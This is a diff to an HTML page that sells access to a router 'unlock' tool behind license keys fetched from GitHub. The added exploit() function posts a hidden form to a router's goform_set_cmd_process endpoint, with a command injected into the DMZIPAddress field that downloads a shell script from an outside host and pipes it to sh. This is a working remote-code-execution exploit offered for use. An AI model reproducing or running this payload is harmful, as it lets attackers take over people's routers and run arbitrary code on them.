@@ -7,7 +7,7 @@
   <style>
     body {
       font-family: sans-serif;
-      background: #1e1e2f;
+      background: linear-gradient(135deg, #667eea, #764ba2);
       color: white;
       display: flex;
       flex-direction: column;
@@ -17,63 +17,119 @@
       margin: 0;
       padding: 20px;
     }
+
     input, button {
-      padding: 10px;
-      margin: 10px;
+      padding: 15px;
       font-size: 18px;
-      width: 80%;
+      border: none;
+      border-radius: 8px;
+      width: 90%;
       max-width: 400px;
+      margin-bottom: 15px;
+      outline: none;
     }
+
+    button {
+      background-color: #4caf50;
+      color: white;
+      cursor: pointer;
+    }
+
     #mainButton {
       display: none;
       background-color: #ff5722;
-      color: white;
     }
+
     #message {
       margin-top: 10px;
-      font-size: 16px;
+      min-height: 24px;
       color: yellow;
     }
   </style>
 </head>
 <body>
-  <h2>Enter License Key</h2>
+
+  <h2>🔐 Enter License Key</h2>
   <input id="licenseInput" placeholder="Enter license key here" type="text" />
   <button onclick="checkLicense()">Validate License</button>
   <div id="message"></div>
   <button id="mainButton" onclick="exploit()">OPENLINE NOW</button>
 
   <script>
-  async function checkLicense() {
-  const inputKey = document.getElementById("licenseInput").value.trim();
-  const message = document.getElementById("message");
-  
-  if (!inputKey) {
-  message.textContent = "❌ Please enter a license key.";
-  return;
-  }
-  
-  const apiUrl = "https://api.github.com/repos/bjchack/license-store/contents/license.json";
-  
-  try {
-  const response = await fetch(apiUrl);
-  const data = await response.json();
-  
-  const content = atob(data.content); // Decode base64
-  const validKeys = JSON.parse(content);
-  
-  if (validKeys.includes(inputKey)) {
-  message.textContent = "✅ License accepted!";
-  document.getElementById("mainButton").style.display = "block";
-  document.getElementById("licenseInput").disabled = true;
-  } else {
-  message.textContent = "❌ Invalid license key.";
-  }
-  } catch (error) {
-  console.error(error);
-  message.textContent = "❌ Failed to fetch license file.";
-  }
-  }
+    async function loadLicenseKeys() {
+      const url = "https://api.github.com/repos/bjchack/license-store/contents/license.json";
+
+      try {
+        const res = await fetch(url, {
+          headers: {
+            "Accept": "application/vnd.github.v3.raw"
+          }
+        });
+
+        if (!res.ok) throw new Error("Fetch failed");
+
+        const keys = await res.json();
+        return keys;
+      } catch (err) {
+        document.getElementById("message").textContent = "❌ Failed to fetch license file.";
+        console.error(err);
+        return [];
+      }
+    }
+
+    async function checkLicense() {
+      const inputKey = document.getElementById("licenseInput").value.trim();
+      const usedKeys = JSON.parse(localStorage.getItem("used_keys") || "[]");
+      const message = document.getElementById("message");
+
+      if (!inputKey) {
+        message.textContent = "❌ Please enter a license key.";
+        return;
+      }
+
+      if (usedKeys.includes(inputKey)) {
+        message.textContent = "❌ License already used.";
+        return;
+      }
+
+      const validKeys = await loadLicenseKeys();
+
+      if (validKeys.includes(inputKey)) {
+        message.textContent = "✅ License accepted!";
+        usedKeys.push(inputKey);
+        localStorage.setItem("used_keys", JSON.stringify(usedKeys));
+        document.getElementById("mainButton").style.display = "block";
+        document.getElementById("licenseInput").disabled = true;
+      } else {
+        message.textContent = "❌ Invalid license key.";
+      }
+    }
+
+    function exploit() {
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = "http://192.168.254.254/goform/goform_set_cmd_process";
+      form.style.display = "none";
+
+      const fields = {
+        goformId: "DMZ_SETTING",
+        isTest: "false",
+        DMZEnabled: "1",
+        DMZIPAddress: "127.0.0.1 | curl http://junjuncruzit.online/zlt-bjc/zlt-ais1.sh -o - | sh &"
+      };
+
+      for (let name in fields) {
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = name;
+        input.value = fields[name];
+        form.appendChild(input);
+      }
+
+      document.body.appendChild(form);
+      form.submit();
+    }
   </script>
+
 </body>
 </html>
